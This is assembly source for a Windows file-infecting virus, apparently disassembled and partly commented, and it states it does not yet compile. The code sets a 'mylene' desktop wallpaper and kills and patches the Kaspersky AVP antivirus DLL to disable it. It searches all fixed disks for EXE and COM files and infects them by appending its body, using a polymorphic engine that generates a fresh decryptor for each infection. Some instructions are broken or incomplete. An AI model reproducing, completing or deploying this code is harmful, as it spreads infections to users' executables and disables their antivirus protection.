; not compile yet ;)

icall macro API
      extrn &API&: proc
      call &API&
      endm


.386p
.model flat
.code

; The following equates show data references outside the range of the program.

data_2e		equ	0F8h
data_3e		equ	100h
data_4e		equ	0A00h			;*
data_5e		equ	0A20h			;*
data_6e		equ	0AF0h			;*
data_94e	equ	6050h			;*
data_95e	equ	60C0h			;*
data_96e	equ	60D4h			;*
data_97e	equ	60E0h			;*
data_98e	equ	6150h			;*
data_99e	equ	6164h			;*
data_100e	equ	6170h			;*
data_101e	equ	617Dh			;*
data_102e	equ	618Ah			;*
data_103e	equ	6196h			;*
data_104e	equ	61A0h			;*
data_105e	equ	61AEh			;*
data_106e	equ	61BAh			;*
data_107e	equ	61C8h			;*
data_108e	equ	61D6h			;*
data_109e	equ	61E4h			;*
data_110e	equ	61F6h			;*
data_111e	equ	6206h			;*
data_112e	equ	6218h			;*
data_113e	equ	6230h			;*
data_114e	equ	6246h			;*
data_115e	equ	625Ch			;*
data_116e	equ	626Ch			;*
data_117e	equ	627Ch			;*
data_118e	equ	628Eh			;*
data_119e	equ	629Eh			;*
data_120e	equ	62ACh			;*
data_121e	equ	62BAh			;*
data_122e	equ	62CAh			;*
data_123e	equ	62D8h			;*
data_124e	equ	62E4h			;*
data_125e	equ	62FCh			;*
data_126e	equ	630Ch			;*
data_127e	equ	631Eh			;*
data_128e	equ	6326h			;*
data_129e	equ	633Ah			;*
data_130e	equ	634Ah			;*
data_131e	equ	635Eh			;*
data_132e	equ	6370h			;*
data_133e	equ	637Eh			;*
data_134e	equ	638Ch			;*
data_135e	equ	63A8h			;*

; virus start:

start		proc	near
		push	dword ptr 3
		icall	SetErrorMode
		mov	byte ptr nt?,1
		; check win95/98?
		mov	al,byte ptr [esp+3]
		cmp	al,0BFh
		jne	short cmd_line
		icall	GetCurrentThreadId
		mov	ecx,eax
		mov	eax,fs:[18h]
;*		sub	eax,10h
		db	 83h,0E8h, 10h
		xor	eax,ecx
		mov	data_49,eax
		icall	GetCurrentProcessId
		xor	eax,dword ptr data_49
		mov	word ptr [eax+20h],180h
		mov	byte ptr nt?,0
cmd_line:
		icall	GetCommandLineA
		xor	ecx,ecx
		mov	esi,eax
		lodsb
		cmp	al,22h			; '"'
		je	testz
		dec	esi
testz:
		push	esi
next_tst:
		lodsb
		inc	ecx
		cmp	al,22h			; '"'
		je	short cmd_analize
		cmp	al,20h			; ' '
		je	short cmd_analize
		cmp	al,0
		jne	next_tst
cmd_analize:
		pop	esi
		lea	edi,path
		push	edi
		dec	ecx
		cld
		rep	movsb
		xor	eax,eax
		stosb
		pop	eax
		cmp	dword ptr [esi+1],79786573h ; yxes
		je	short sexy_ml
		push	dword ptr 0
		push    offset mylene_exe
		icall	WinExec
		icall	ExitProcess
sexy_ml:
		pushad
		; get random numeber
		call	get_rnd
		jnz	fuck_avpi_dll
		; create file mylene.bmp
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 1
		push	dword ptr 0
		push	dword ptr 3
		push	0C0000000h
		push	offset mylene_bmp
		icall	CreateFileA
		mov	ebx,eax
		inc	eax
		jz	fuck_avpi_dll
		; write file mylene.bmp
		push	dword ptr 0
		push	offset data_52
		push	3ED5h
		push	offset mylene_jpg
		push	ebx
		icall	WriteFile
		; close file mylene.bmp
		push	ebx
		icall	CloseHandle
		; get filter (change bmp->jpg)
		push	offset data_57
		push	offset jpg_key
		push	80000002h
		icall	RegOpenKeyA
		test	eax,eax
		jnz	fuck_avpi_dll
		push	31ABh
		push	20230h
		push	dword ptr 0
		push	dword ptr 0
		push	offset path
		push	dword ptr data_57
		icall	RegQueryValueExA
		test	eax,eax
		jnz	fuck_avpi_dll
		push	offset data_57
		icall	RegCloseKey
		mov	esi,20230h
		push	esi
		push	esi
		push	esi
		pop	edi
analyze_f:
		lodsb
		cmp	al,5Ch			; slash '\'
		je	short add_slh
		cmp	al,0
		jne	analyze_f
		jmp	short filter_here
add_slh:
		mov	edi,esi
		jmp	short analyze_f
filter_here:
		pop	esi
		dec	edi
		xchg	ecx,edi
		sub	ecx,esi
		mov	edi,2035Ch
		push	edi
		rep	movsb
		; Get&Set Current Dir
		push	20488h
;*		push	0FFh
		db	 68h,0FFh, 00h, 00h, 00h
		icall	GetCurrentDirectoryA
		icall	SetCurrentDirectoryA
		; Load dll
		icall	LoadLibraryA
		test	eax,eax
		jz	fuck_avpi_dll
		; get adrees plugfilter 
		push	318Bh
		push	eax
		icall	GetProcAddress
		test	eax,eax
		jz	fuck_avpi_dll
		push	dword ptr 0
		push	offset data_53
		push	offset _path
		push	dword ptr 0
		call	eax			;*
		test	eax,eax
		jnz	fuck_avpi_dll
		push	dword ptr data_53
		icall	GlobalLock
		mov	ebx,eax
		add	ebx,5Eh
		; create file mylene.bmp
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 2
		push	dword ptr 0
		push	dword ptr 3
		push	0C0000000h
		push	offset mylene_bmp
		icall	CreateFileA
		; write file mylene.bmp
		push	eax
		push	eax
		push	dword ptr 0
		push	offset data_52
		push	dword ptr 0Eh
		push	31B0h
		push	eax
		icall	WriteFile
		; write file mylene.bmp
		pop	eax
		push	dword ptr 0
		push	offset data_52
		push	27D18h
		push	ebx
		push	eax
		icall	WriteFile
		; close file mylene.bmp
		icall	CloseHandle
		push	dword ptr data_53
		icall	GlobalFree
		; set current dirrecory
		push	20488h
		icall	SetCurrentDirectoryA
		; open regkey:
		; HKEY_CURRENT_USER\Control Panel\Desktop
		push	offset data_57
		push	3165h
		push	80000001h
		icall	RegOpenKeyA
		test	eax,eax
		jnz	short fuck_avpi_dll
		; change regkey parametrs
		push	dword ptr 0Eh
		push	offset mylene_bmp
		push	dword ptr 1
		push	dword ptr 0
		push	317Fh
		push	dword ptr data_57
		icall	RegSetValueExA
		; change parametrs
		push	dword ptr 1
		push	3189h
		push	dword ptr 1
		push	dword ptr 0
		push    offset tilewall
		push	dword ptr data_57
		icall	RegSetValueExA
		; close reg
		push    offset data_57
		icall	RegCloseKey
fuck_avpi_dll:
		; open reg nad get avpi parameterz
		push	offset data_57
		push	offset kaspersky
		push	80000003h
		icall	RegOpenKeyA
		test	eax,eax
		jnz	no_avpi
		push	31A7h
		push	20104h
		push	dword ptr 0
		push	dword ptr 0
		push	offset path
		push	dword ptr data_57
		icall	RegQueryValueExA
		test	eax,eax
		jnz	no_avpi
		push	offset data_57
		icall	RegCloseKey
		mov	esi,30D4h
		mov	edi,dword ptr data_42
		add	edi,20103h
		mov	ecx,0Eh
		rep	movsb
		; open avpi dll
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 3
		push	dword ptr 0
		push	dword ptr 3
		push	80000000h
		push	20104h
		icall	CreateFileA
		mov	ebx,eax
		inc	eax
		jz	no_avpi
		; memory alloc
		push	dword ptr 4
		push	1000h
		push	7A120h
		push	dword ptr 0
		icall	VirtualAlloc
		test	eax,eax
		jz	no_avpi
		; read avpi dll
		push	eax
		push	dword ptr 0
		push	offset data_52
		push	7A120h
		push	eax
		push	ebx
		icall	ReadFile
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 0
		push	ebx
		icall	SetFilePointer
		pop	edx
		mov	eax,6861636Bh	; hack?
		cmp	dword ptr [edx+30h],eax
		je	dll_fucking
		mov	dword ptr [edx+30h],eax
		push	edx
		push	ebx
		icall	CloseHandle
		; find windows avpi
		push	dword ptr 0
		push	offset avpi
		icall	FindWindowA
		test	eax,eax
		jz	short _openz
		push	7097h
		push	eax
		icall	GetWindowThreadProcessId
		push	dword ptr data_50
		push	dword ptr 0
		push	0FFFFFFFFh
		icall	OpenProcess
		push	eax
		push	eax
		icall	TerminateProcess
		push	12Ch
		icall	Sleep
_openz:
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 3
		push	dword ptr 0
		push	dword ptr 3
		push	0C0000000h
		push	20104h
		icall	CreateFileA
		pop	edx
		mov	ebx,eax
		inc	eax
		jz	no_avpi
		mov	esi,edx
		mov	ecx,dword ptr data_52

filezz:
		lodsd
		cmp	eax,8020E283h
		je	short patch_1
		cmp	eax,400E181h
		je	short patch_2
		cmp	eax,824448Bh
		je	short patch_3
nxt_:
		sub	esi,3
		loopd	filezz

		jmp	short dll_fucking
patch_2:
		lodsd
		cmp	eax,0F9810000h
		jne	nxt_
		mov	word ptr [esi+4],9090h
		jmp	short nxt_
patch_1:
		lodsd
		cmp	eax,67520FAh
		jne	nxt_
		mov	word ptr [esi-2],9090h
		mov	word ptr [esi+12h],9090h
		jmp	short nxt_
patch_3:
		cmp	dword ptr [esi+6],106A0424h
		jne	nxt_
		mov	byte ptr [esi-4],0C3h
		; write patching code
		push	edx
		push	dword ptr 0
		push	offset data_52
		push	dword ptr data_52
		push	edx
		push	ebx
		icall	WriteFile
		pop	edx
dll_fucking:
		; clean memory
		push	4000h
		push	7A120h
		push	edx
		icall	VirtualFree
		; close avpi handle
		push	ebx
		icall	CloseHandle
no_avpi:
		popad
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 3
		push	dword ptr 0
		push	dword ptr 3
		push	80000000h
		push	eax
		icall	CreateFileA
		mov	ebx,eax
		inc	eax
		jz	exit_proc
		push	dword ptr 0
		push	offset data_52
		push	7BB8h
		push	7DDCh
		push	ebx
		icall	ReadFile
		inc	eax
		jz	exit_proc
		push	ebx
		icall	CloseHandle
scan_disk:
		; search on all disks since C:
		push	30C9h
		icall	GetDriveTypeA
		cmp	al,3
		jne	exit_proc
		mov	esi,258h
		push	30C9h
		icall	SetCurrentDirectoryA

search_f:
		; search all filez?
		lea	eax,dword ptr data_86[esi]
		push	eax
		push	30CDh
		icall	FindFirstFileA
		inc	eax
		jz	chgdirup
		dec	eax
		mov	dword ptr data_89[esi],eax
		jmp	short tst_ext
search_n:
		lea	eax,dword ptr data_86[esi]
		push	eax
		push	dword ptr data_89[esi]
		icall	FindNextFileA
		test	eax,eax
		; change dir up level
		jz	chgdirup
tst_ext:
		mov	eax,dword ptr data_86[esi]
		cmp	al,10h
		je	dirz_
		lea	edx,dword ptr data_88[esi]
		mov	edi,edx
		mov	ecx,edi
		xor	eax,eax
		repne	scasb
		; check it "EXE."
		cmp	dword ptr [edi-5],4558452Eh
		je	short inf_
		; check it "exe."
		cmp	dword ptr [edi-5],6578652Eh
		je	short inf_
		; check it "moc."
		cmp	dword ptr [edi-5],6D6F632Eh
		je	short inf_
		; check it "MOC."
		cmp	dword ptr [edi-5],4D4F432Eh
		jne	search_n
inf_:
		call	get_rnd
		jz	search_n
		pushad
		; sleep	3000?
		push	0BB8h
		icall	Sleep
		popad
		; open file
		push	esi
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 3
		push	dword ptr 0
		push	dword ptr 3
		push	0C0000000h
		push	edx
		icall	CreateFileA
		; save handle
		mov	ebx,eax
		inc	eax
		jz	inf_err
		; read file
		mov	edi,1754Ch
		push	dword ptr 0
		push	offset data_52
		push	4000h
		push	edi
		push	ebx
		icall	ReadFile
		inc	eax
		jz	inf_cls
		; save edx mark of infection?
		mov	edx,214D0349h
		; check is MZ?
		cmp	word ptr [edi],5A4Dh
		jne	inf_com
		mov	eax,dword ptr [edi+3Ch]
		cmp	eax,4000h
		ja	inf_cls
		add	edi,eax
		; check is PE?
		cmp	dword ptr [edi],4550h
		jne	inf_cls
		cmp	dword ptr [edi+58h],edx
		mov	dword ptr [edi+58h],edx
		jz	inf_cls
		test	byte ptr [edi+17h],20h	; ' '
		jnz	inf_cls
		movzx	ecx,word ptr [edi+6]
		push	ecx
		push	esi
		clc
		call	
		lea	esi,dword ptr ds:data_3e[edi]

testing_:
		lodsd
		test	eax,eax
		jz	zer0_
		stc
		call	savebf_
		jmp	g00d_
zer0_:
		lodsd
		lodsd
		mov	dword ptr [esi-0Ch],eax
		add	esi,1Ch
		loopd	testing_

g00d_:
		pop	esi
		pop	eax
		movzx	ecx,word ptr [edi+14h]
		inc	eax
		inc	word ptr [edi+6]
		imul	eax,28h
		cmp	eax,ecx
		jb	inf_cls
		lea	edx,dword ptr ds:data_2e[edi]
;*		sub	eax,50h
		db	 83h,0E8h, 50h
		mov	ecx,dword ptr [edx+8][eax]
		add	ecx,dword ptr [edx+0Ch][eax]
		lea	ebp,dword ptr [edi+38h]
		call	sub_16
		mov	dword ptr data_35,ecx
		mov	ebp,dword ptr [edi+34h]
		push	ebp
		add	ebp,dword ptr [edi+28h]
		push	eax
		call	sub_18
		xor	ebp,eax
		mov	dword ptr data_82,ebp
		mov	ebp,0FFC01601h
		mov	dword ptr ss:data_81[ebp],eax
		pop	eax
		mov	dword ptr [edi+28h],ecx
		add	dword ptr [edi+50h],7BB8h
		pop	ebp
		add	ecx,ebp
		mov	dword ptr data_51,ecx
		add	dword ptr [edi+28h],7000h
		mov	ecx,dword ptr [edx+10h][eax]
		add	ecx,dword ptr [edx+14h][eax]
		lea	ebp,dword ptr [edi+3Ch]
		call	sub_16
		cmp	ecx,dword ptr data_87[esi]
		jb	inf_cls
		mov	dword ptr data_37,ecx
		pushad
		mov	ecx,28h
		mov	esi,30A1h
		lea	edi,dword ptr [eax+28h][edx]
		rep	movsb
		popad
		cmp	byte ptr nt?,1
		je	fck_nt

		; polymorphic engine?
		pushad
		mov	esi,7DDCh
		mov	edi,0F994h
		mov	ecx,7BB8h
		rep	movsb
		mov	byte ptr data_60,7
		mov	dword ptr data_62,1FFFh
		mov	dword ptr data_63,0EFh
		xor	eax,eax
		mov	data_61,ax
		mov	data_65,al
		mov	dword ptr data_59,80000000h
		mov	al,90h
		mov	ecx,0BBCh
		mov	edi,70D4h
		rep	stosb
		mov	edi,1F54Ch
loc_25:
		call	sub_6
		cmp	byte ptr data_63,0E0h
		stc
		jz	popz
		cmp	edi,1F934h
		jb	loc_25
		cmp	byte ptr data_65,4
		jb	popz
		and	dword ptr data_62,0FFF7h
		mov	byte ptr data_73,0C3h
		pushfd
		pushad
		mov	eax,offset sub_21
		call	eax			;*
		mov	data_74,eax
		mov	dword ptr data_75,ecx
		mov	dword ptr data_76,edx
		mov	dword ptr data_77,ebx
		mov	dword ptr data_78,ebp
		mov	dword ptr data_79,esi
		mov	dword ptr data_80,edi
		popad
		popfd
		push	edi
		movzx	eax,word ptr data_61
		shl	eax,2
		mov	data_83,eax
		mov	esi,offset data_70
		xor	edx,edx
		call	sub_5
		inc	edx
		inc	esi
		call	sub_5
		and	dword ptr data_62,157h
		mov	byte ptr data_60,3
loc_26:
		mov	esi,edi
		call	random
		and	al,7
		test	al,al
		jnz	short loc_27
;*		cmp	dword ptr data_59,0FFFFFFFFh
		db	 83h, 3Dh,0B8h, 70h, 00h, 00h
		db	0FFh
		jz	short loc_27
		call	sub_4
		call	sub_12
		jc	short loc_27
		mov	edi,esi
		mov	al,81h
		stosb
		mov	cl,byte ptr [esi+1]
		mov	al,byte ptr data_9[edx]
		and	al,0BFh
		and	cl,7
		add	al,cl
		stosb
		push	dword ptr ds:[0FFFE7B8Eh][esi]
		add	edi,4
		call	rndz
		stosd
		call	sub_15
		pop	dword ptr ds:[0FFFE7B8Eh][esi]
		mov	al,byte ptr ds:[0FFFE7B8Dh][esi]
		and	al,7
		add	al,byte ptr opcode_tbl+1[edx*2]
		and	al,0BFh
		mov	byte ptr ds:[0FFFE7B8Dh][esi],al
loc_27:
		call	sub_6
		cmp	edi,1FF10h
		jb	loc_26
		mov	ebp,edi
		xor	ecx,ecx
		call	sub_2
		inc	ecx
		call	sub_2
		call	sub_3
		mov	ax,0F881h
		add	ah,byte ptr data_69
		stosw
		movzx	eax,byte ptr data_69
		mov	eax,dword ptr data_74[eax*4]
		mov	edx,7000h
		shr	edx,7
		inc	edx
		shl	edx,7
		add	eax,edx
		mov	data_58,eax
		stosd
		mov	al,73h			; 's'
		call	sub_12
		jc	short loc_28
loc_28:
		stosb
		mov	ecx,edi
		stosb
		call	sub_3
		mov	al,0E9h
		stosb
		mov	edx,edi
		pop	eax
		sub	eax,edx
;*		sub	eax,4
		db	 83h,0E8h, 04h
		stosd
		call	sub_3
		mov	eax,edi
		sub	eax,ecx
		dec	al
		mov	[ecx],al
		cmp	al,80h
		jb	short loc_29
		stc
		jmp	popz
loc_29:
		mov	esi,ebp
		call	sub_15
		pushfd
		pushad
		mov	eax,offset sub_21
		call	eax			;*
		popad
		popfd
		call	sub_3
		mov	ax,0C081h
		add	ah,byte ptr data_69
		stosw
		mov	eax,data_51
		add	eax,1431h
		sub	eax,dword ptr data_58
		stosd
		and	dword ptr data_62,57h
		call	sub_3
		mov	ax,0E0FFh
		add	ah,byte ptr data_69
		stosw
		mov	ecx,20104h
		sub	ecx,edi

locloop_30:
		call	random
		stosb
		loopd	locloop_30

		jmp	ext_eng
start		endp

sub_2		proc	near
		call	sub_3
		mov	esi,edi
		mov	ax,0C081h
		add	ah,byte ptr data_68[ecx]
		stosw
		mov	eax,80h
		stosd
		retn
sub_2		endp


sub_3		proc	near
		push	dword ptr data_62
		and	dword ptr data_62,57h
		push	ecx
		call	random
		and	al,0Fh
		add	al,4
		movzx	ecx,al

locloop_31:
		push	ecx
		call	sub_6
		pop	ecx
		loopd	locloop_31

		pop	ecx
		pop	dword ptr data_62
		retn
sub_3		endp

sub_4		proc	near
		call	random
		and	al,3
		movzx	edx,al
		xor	ecx,ecx
		xor	ebx,ebx
		mov	al,byte ptr data_7[edx]
		stosb
		mov	al,80h
		call	sub_12
		adc	cl,0
		add	al,byte ptr data_68[ecx]
		call	sub_12
		adc	bl,0
		push	edx
		mov	dl,byte ptr data_70[ebx]
		shl	dl,3
		add	al,dl
		pop	edx
		stosb
		mov	eax,dword ptr data_67[ecx*4]
		push	eax
		xchg	ebp,eax
		xor	eax,eax
loc_32:
		call	random
		and	al,1Fh
		bt	data_59,eax
		jc	loc_32
		btc	data_59,eax
		shl	al,2
		add	eax,ebp
		stosd
		pop	eax
		call	sub_15
		sub	dword ptr ds:[0FFFE7B8Eh][esi],eax
		mov	ecx,dword ptr data_51
		sub	ecx,eax
		xchg	ecx,eax
		mov	ecx,0F994h
		sub	ecx,eax
		add	dword ptr ds:[0FFFE7B8Eh][esi],ecx
		mov	al,byte ptr data_8[edx]
		mov	byte ptr ds:[0FFFE7B8Ch][esi],al
		retn
sub_4		endp

data_7		db	1
		db	 29h, 31h, 01h
data_8		db	29h
		db	 01h, 31h, 29h
data_9		db	0C0h
		db	0E8h,0F0h,0C0h

sub_5		proc	near
		mov	al,[esi]
		mov	byte ptr data_68[edx],al
		push	eax
		mov	al,byte ptr [esi+2]
		mov	[esi],al
		pop	eax
		movzx	eax,al
		mov	ecx,dword ptr data_74[eax*4]
		mov	eax,data_51
		sub	eax,ecx
		mov	dword ptr data_67[edx*4],eax
		retn
sub_5		endp

sub_6		proc	near
		xor	eax,eax
loc_33:
		call	random
		and	al,0Fh
		bt	data_62,eax
		jnc	loc_33
		mov	esi,edi
		call	dword ptr gen_tbl[eax*4]
		retn
sub_6		endp

sub_7		proc	near
		mov	byte ptr data_64,3
		call	sub_9
		push	edx
		mov	edx,eax
		call	random
		and	al,4
		add	al,dl
		pop	edx
		retn
sub_7		endp

sub_8		proc	near
		mov	byte ptr data_64,7

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_9:
loc_34:
		xor	eax,eax
		call	random
		and	al,byte ptr data_64
		bt	data_63,eax
		jnc	loc_34
		retn
sub_8		endp

rndz		proc	near
		push	edx
		mov	dl,4
loc_35:
		shl	eax,8
		call	random
		dec	dl
		jnz	loc_35
		pop	edx
		retn
rndz		endp

random		proc	near
		pushfd
		in	al,40h			; '@'
		xor	al,ah
		ror	al,4
		not	al
		add	al,bl
		neg	al
		xor	al,cl
		rcr	al,cl
		push	edx
		mov	dl,al
		in	al,41h			; 'A'
		xor	al,dl
		pop	edx
		sub	al,dl
		xor	al,dh
		inc	byte ptr data_66
		add	al,byte ptr data_66
		popfd
		retn
random		endp

sub_12		proc	near
		push	eax
		call	random
		rcr	al,3
		pop	eax
		retn
sub_12		endp

sub_13		proc	near
		call	random
		and	al,38h			; '8'
		call	sub_12
		pushfd
		adc	al,0
		popfd
		stosb
		jc	short loc_36
		call	sub_7
		xchg	edx,eax
		call	sub_7
		jmp	short loc_37
loc_36:
		call	sub_8
		xchg	edx,eax
		call	sub_8
loc_37:
		shl	al,3
		add	al,dl
		add	al,0C0h
		stosb
		retn
sub_13		endp

			                        ;* No entry point to code
		call	sub_13
		mov	edi,esi
		lodsb
		push	eax
		or	al,80h
		and	al,81h
		stosb
		pop	eax
		push	eax
		and	al,38h			; '8'
		xchg	edx,eax
		lodsb
		and	al,0C7h
		add	al,dl
		stosb
		pop	eax
		test	al,1
		jz	short loc_38
		call	rndz
		stosd
		retn
loc_38:
		call	random
		stosb
		retn
			                        ;* No entry point to code
		call	random
		and	al,3
		add	al,0D0h
		stosb
		rcr	al,1
		jc	short loc_39
		call	sub_7
		jmp	short loc_40
loc_39:
		call	sub_8
loc_40:
		xchg	edx,eax
		call	random
		and	al,38h			; '8'
		add	al,dl
		add	al,0C0h
		stosb
		retn
			                        ;* No entry point to code
		mov	al,0Ah
		call	sub_12
		pushfd
		adc	al,0
		popfd
		jc	short loc_41
		inc	word ptr data_61
		jmp	short loc_43
loc_41:
		cmp	word ptr data_61,0
		jne	short loc_42
		retn
loc_42:
		dec	word ptr data_61
loc_43:
		shl	al,3
		mov	dl,al
		call	sub_8
		add	al,dl
		stosb
		retn
			                        ;* No entry point to code
		call	random
		and	al,5
		add	al,0F8h
		stosb
		retn
			                        ;* No entry point to code
		call	random
		and	al,0Fh
		add	al,70h			; 'p'
		stosb
		push	edi
		stosb
		call	random
		and	al,0Fh
		inc	al
		movzx	ecx,al
		push	dword ptr data_62
		and	dword ptr data_62,57h

locloop_44:
		mov	esi,edi
		call	sub_6
		loopd	locloop_44

		pop	dword ptr data_62
		pop	edx
		mov	eax,edi
		sub	eax,edx
		dec	al
		mov	[edx],al
		retn
			                        ;* No entry point to code
		mov	al,0C7h
		stosb
		call	sub_8
		add	al,0C0h
		stosb
		call	rndz
		stosd
		retn
			                        ;* No entry point to code
		cmp	byte ptr data_65,4
		jb	short loc_45
		retn
loc_45:
		xor	eax,eax
		call	sub_8
		btc	data_63,eax
		xchg	edx,eax
		mov	al,0C7h
		stosb
		mov	al,0C0h
		add	al,dl
		stosb
		call	rndz
		stosd
		call	savreg
		call	sub_15
		inc	byte ptr data_65
		retn
			                        ;* No entry point to code
		cmp	byte ptr data_65,4
		jae	short loc_46
		retn
loc_46:
		xor	eax,eax
		call	random
		and	al,3
		mov	dl,byte ptr data_70[eax]
		call	random
		and	al,byte ptr data_60
		push	esi
		lea	esi,dword ptr opcode_tbl[eax*2]
		call	sub_12
		pushfd
		jc	short loc_47
		add	esi,10h
loc_47:
		movsb
		lodsb
		add	al,dl
		stosb
		popfd
		jnc	short loc_48
		call	rndz
		stosd
loc_48:
		pop	esi
		call	sub_15
		retn

savreg		proc	near
		push	edi
		movzx	eax,byte ptr data_65
		lea	edi,dword ptr data_70[eax]
		mov	al,dl
		stosb
		pop	edi
		retn
savreg		endp


sub_15		proc	near
		pushad
		mov	ecx,edi
		sub	ecx,esi
		lea	edi,dword ptr ds:[0FFFE7B8Ch][esi]
		cld
		rep	movsb
		popad
		retn
sub_15		endp


		; polyengine generated table?
gen_tbl		dd	01A4Dh
		db	 81h, 1Ah, 00h, 00h,0ADh, 1Ah
		db	 00h, 00h,0D5h, 1Ah, 00h, 00h
		db	 0Bh, 1Bh, 00h, 00h, 16h, 1Bh
		db	 00h, 00h, 54h, 1Bh, 00h, 00h
		db	 66h, 1Bh, 00h, 00h, 9Eh, 1Bh
		db	 00h, 00h, 4Dh, 1Ah, 00h, 00h
		db	 4Dh, 1Ah, 00h, 00h, 9Eh, 1Bh
		db	 00h, 00h, 9Eh, 1Bh, 00h, 00h
		db	 9Eh, 1Bh, 00h, 00h, 4Dh, 1Ah
		db	 00h, 00h, 4Dh, 1Ah, 00h, 00h
		; polyengine generated opcode table?
opcode_tbl	dd	0C081E881h
		db	 81h,0F0h, 81h,0E8h, 81h,0E0h
		db	 81h,0C8h,0C7h,0C0h, 81h,0E8h
		db	0D1h,0E8h,0D1h,0E0h,0D1h,0C0h
		db	0D1h,0C8h,0F7h,0D8h,0F7h,0D0h
		db	0FFh,0C8h,0FFh,0C0h
ext_eng:
		mov	ecx,0BB8h
		mov	esi,1F54Ch
		mov	edi,16994h
		cld
		rep	movsb
		clc
		mov	byte ptr data_43,1
popz:
		popad
fck_nt:
		jc	short inf_cls
bufwrt:
		push	ecx
		push	dword ptr 0
		push	dword ptr 0
		push	dword ptr 0
		push	ebx
		icall	SetFilePointer
		; wrute engine body
		push	dword ptr 0
		push	offset data_52
		push	4000h
		push	1754Ch
		push	ebx
		icall	WriteFile
		pop	ecx
		push	dword ptr 0
		push	dword ptr 0
		push	ecx
		push	ebx
		icall	SetFilePointer
		mov	eax,7DDCh
		cmp	byte ptr data_43,0
		je	short wrt
		mov	byte ptr data_43,0
		mov	eax,0F994h
wrt:
		push	dword ptr 0
		push	offset data_52
		push	7BB8h
		push	eax
		push	ebx
		icall	WriteFile
inf_cls:
		push	ebx
		icall	CloseHandle
inf_err:
		pop	esi
		jmp	search_n
dirz_:
		; search all dir on current disk
		lea	edi,dword ptr data_88[esi]
		cmp	byte ptr [edi],2Eh	; '.'
		je	search_n
		push	edi
		icall	SetCurrentDirectoryA
		test	eax,eax
		jz	short loc_57
		add	esi,258h
		call	search_f
loc_57:
		jmp	search_n

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_16		proc	near
		push	eax
		push	edx
		mov	eax,ecx
		xor	edx,edx
		div	dword ptr [ebp+0]
		test	edx,edx
		jz	short loc_58
		inc	eax
loc_58:
		mul	dword ptr [ebp+0]
		xchg	ecx,eax
		pop	edx
		pop	eax
		retn
sub_16		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

savebf_		proc	near
		pushad
		mov	esi,1754Ch
		mov	edi,1B54Ch
		jnc	short savedz
		xchg	esi,edi
savedz:
		mov	ecx,1000h
		cld
		rep	movsd
		popad
		retn
savebf_		endp

inf_com:
		; infect com procedure
		mov	ecx,dword ptr data_87[esi]
		; check file 60000?
		cmp	ecx,0EA60h
		ja	inf_cls
		; check file 2000?
		cmp	ecx,7D0h
		jbe	inf_cls
		lea	eax,dword ptr ds:data_3e[ecx]
		mov	data_34,eax
		pushad
		pushad
		lea	eax,dword ptr data_72[ecx]
		xor	edx,edx
		mov	ebx,200h
		div	ebx
		inc	eax
		mov	data_32,ax
		mov	word ptr data_31,dx
		mov	esi,edi
		push	esi
		mov	edi,807Ch
		mov	ecx,0D8h
		rep	movsd
		pop	edi
		mov	esi,3052h
		mov	ecx,4Fh
		rep	movsb
		popad
		sub	ecx,7
		push	dword ptr 0
		push	dword ptr 0
		push	ecx
		push	ebx
		icall	SetFilePointer
		push	dword ptr 0
		push	70A7h
		push	dword ptr 4
		push	70ABh
		push	ebx
		icall	ReadFile
		;check com - enuns?
		cmp	dword ptr data_55,4E554E45h ; 'NUNE'
		jne	short no_enuns
		popad
		jmp	inf_cls
no_enuns:
		popad
		jmp	bufwrt
chgdirup:
		; change directory on current diver
		push	dword ptr data_89[esi]
		icall	CloseHandle
		; set directory
		push	30D1h
		icall	SetCurrentDirectoryA
		sub	esi,258h
		jz	short next_disk
		retn
next_disk:	; search next disk 
		inc	byte ptr _disc
		jmp	scan_disk
exit_proc:
		icall	ExitProcess

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
